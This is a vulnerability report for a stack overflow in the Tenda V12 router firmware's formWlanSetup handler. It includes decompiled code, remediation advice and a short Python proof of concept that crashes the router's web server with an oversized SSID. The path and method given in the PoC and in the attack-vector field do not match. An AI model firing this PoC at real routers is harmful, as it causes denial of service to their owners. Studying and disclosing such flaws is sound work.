# Tenda V12 V56.1.1.11 was discovered to contain a stack buffer overflow in formWlanSetup

## Overview

- Vendor: Tenda
- Product: V12
- Version: V56.1.1.11
- Component: Boa formWlanSetup
- Vulnerability Class: CWE-121 stack buffer overflow
- Manufacturer: https://www.tendacn.com/

## Affected version

- Firmware ZIP.
- `boa`.

## Vulnerability details

`formWlanSetup` copies the `ssid` parameter with `strcpy` into a 231-byte
stack buffer (`char v49[231]`) with no length check:

```c
v34 = boaGetVar(a1, "ssid", ...);
if ( *v34 || v42[0] == 1 && !*v34 )
    strcpy(v49, v34);
```

An SSID longer than 231 bytes overwrites adjacent locals and the saved frame.
The handler requires an admin session; Boa has no CSRF token.

## PoC

```python
# A 256-byte SSID already crashes Boa; 231/232 bytes are accepted.
python3 - <<'PY'
import requests
requests.get("http://<router>/boaform/formWlanSetup", params={"ssid": "A"*256}, timeout=5)
PY
```

## Reproduction and terminal evidence

Environment: FirmAE full-system V12 image; only `auth_authorize` was
patched. The handler is unchanged.

Observed threshold table:

| ssid length | response | next GET / |
| --- | --- | --- |
| 200 | 200 | 200 |
| 231 | 200 | 200 |
| 232 | 200 | 200 |
| 256 | connection closed (000) | 000 (Boa exited/restarted) |
| 512 | connection closed (000) | 200 (watchdog restart) |
| 1024 | 400 (Boa request limit) | 200 |

The 256-byte crash is consistent with the 231-byte stack buffer. Evidence:
`evidence/overflow-threshold-20261106.log` (parent project).

## Static evidence

IDA decompilation shows `char v49[231]` and the unchecked `strcpy(v49, v34)`;
see `evidence/ida-formWlanSetup-ssid.txt`.

## Impact

Authenticated admin or CSRF denial of service (Boa crash/restart). Control-flow
hijack was not demonstrated; the practical impact is DoS unless a suitable
stack layout/gadget is found.

## Remediation

- Replace `strcpy` with `strlcpy(v49, v34, sizeof(v49))` and reject SSIDs
  longer than 32 bytes.
- Add CSRF tokens to wireless configuration handlers.

## Known CVE relation

**CVE candidate type: new affected model (Tenda V12) for formWlanSetup — candidate new CVE.**

- CVE-2026-85110 covers a Tenda HG10 `formWlanSetup` overflow; this V12
  build has the same class but a different model/version. NVD V12
  `formWlanSetup` returns 0 records (2026-11-06).

## Status and disclosure

Dynamic confirmation of the crash/DoS (FirmAE; handler unchanged). RCE not
proven. Candidate new CVE — new affected model (Tenda V12) for formWlanSetup; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
Tenda

### Product
V12

### Version or Commit
V56.1.1.11

### Vulnerability Class
CWE-121 stack buffer overflow

### CVE_candidate_type
new affected model (Tenda V12) for formWlanSetup — candidate new CVE

### Description
formWlanSetup strcpy's the ssid parameter into a 231-byte stack buffer with no length check.

### Affected_component
Boa formWlanSetup

### Attack_vector
Authenticated POST to /goform/formWlanSetup with a long ssid.

### Product_version
V12 V56.1.1.11

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/V12_V56.1.1.11/report-3.md
```
